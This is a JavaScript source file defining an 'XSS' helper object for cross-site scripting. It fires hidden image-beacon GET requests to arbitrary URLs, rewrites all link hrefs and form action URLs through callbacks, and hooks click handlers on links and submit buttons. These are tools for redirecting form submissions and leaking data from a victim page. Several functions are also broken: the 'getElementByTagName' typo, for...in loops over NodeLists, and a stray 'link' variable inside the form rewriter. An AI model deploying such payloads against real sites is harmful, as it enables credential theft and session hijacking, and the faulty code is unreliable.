var XSS = {
  imgTag: null,

  /*
   * Triggers a GET request to the given URL.
   *
   * @param {String} url
   *   The URL to request.
   */
  get: function(url) {
    if (XSS.imgTag == null)
    {
      XSS.imgTag = document.createElement('img');
      XSS.imgTag.setAttribute('style', 'display: none;');
    }

    XSS.imgTag.setAttribute('src',url);
  },

  /*
   * Rewrites the href attributes for all anchor links in the document.
   *
   * @param {function(href)} callback
   *   The callback to rewrite the hrefs of the links.
   */
  rewriteLinks: function(callback) {
    var links = document.getElementsByTagName('a');

    for (link in links)
    {
      if (link.hasAttribute('href'))
      {
        link.setAttribute('href',callback(link.getAttribute('href')));
      }
    }

  },

  /*
   * Hooks the click event for all anchor links in the document.
   *
   * @param {function} callback
   *   The click event callback.
   */
  hookLinks: function(callback) {
    var links = document.getElementByTagName('a');

    for (link in links)
    {
      if (link.hasAttribute('href'))
      {
        link.onclick = callback;
      }
    }
  },

  /*
   * Rewrites the action attributes for all forms in the document.
   *
   * @param {function(action)} callback
   *   The callback to rewrite the action URL of the forms.
   */
  rewriteForms: function(callback) {
    var forms = document.getElementByTagName('form');

    for (form in forms)
    {
      if (link.hasAttribute('action'))
      {
        form.setAttribute('action',callback(form.getAttribute('action')));
      }
    }
  },

  /*
   * Hooks the click event for all submit buttons in the document.
   *
   * @param {function} callback
   *   The click event callback.
   */
  hookForms: function(callback) {
    var inputs = document.getElementByTagName('input');

    for (input in inputs)
    {
      if (input.hasAttribute('type') && input.getAttribute('type') == 'submit')
      {
        input.onclick = callback;
      }
    }
  }
};
